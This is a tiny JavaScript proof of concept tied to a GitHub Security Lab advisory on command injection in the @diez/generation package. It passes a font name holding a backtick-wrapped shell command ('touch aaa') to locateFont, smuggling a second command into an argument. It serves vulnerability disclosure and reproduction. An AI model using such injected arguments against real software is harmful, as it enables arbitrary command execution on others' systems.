//https://securitylab.github.com/advisories/GHSL-2021-061-diez-generation-cmd-injection/
const generation = require("@diez/generation");
generation.locateFont("foo'`touch aaa` '", {});